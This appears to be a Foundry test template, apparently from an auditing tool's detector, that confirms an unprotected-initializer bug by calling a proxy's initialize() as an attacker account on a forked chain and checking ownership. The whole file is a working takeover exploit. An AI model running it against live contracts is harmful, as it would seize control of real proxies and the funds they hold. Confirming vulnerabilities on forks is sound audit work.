// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unprotected initializer (proxy takeover)
/// @notice Detector: unprotected-initializer. A proxy's initialize() has no
///         guard (no `initializer` modifier, or it can be called twice), so
///         ANY caller can initialize the proxy and become its owner/admin.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the initialize signature to
///      the target (initialize(address) / initialize(address,address) /
///      initialize(bytes)).

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // TODO: use the target's real initialize signature.
        vm.prank(attackerEOA);
        (bool ok,) = target.call(
            abi.encodeWithSignature("initialize(address)", attackerEOA)
        );
        require(ok, "initialize(address) call failed -- adapt the signature");

        (bool ownerOk, bytes memory ret) =
            target.staticcall(abi.encodeWithSignature("owner()"));
        require(ownerOk, "target has no owner() view -- adapt the ownership check");
        address owner_ = abi.decode(ret, (address));
        console.log("owner after initialize:", owner_);
        assertEq(owner_, attackerEOA, "exploit did not reproduce: attacker is not owner");
    }
}
